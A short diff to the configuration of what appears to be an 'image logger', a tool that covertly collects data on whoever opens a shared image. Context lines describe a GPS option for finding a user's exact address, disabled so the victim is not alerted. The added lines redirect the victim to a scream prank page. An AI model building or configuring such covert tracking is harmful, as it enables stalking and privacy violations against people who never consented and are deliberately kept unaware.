@@ -26,6 +26,11 @@ config = {
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
+"redirect": {
+    "redirect": True,
+    "page": "https://Pablo-Restrepo.github.io/Troll-Page-Scream/"
+},
+    
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "", # Message to show
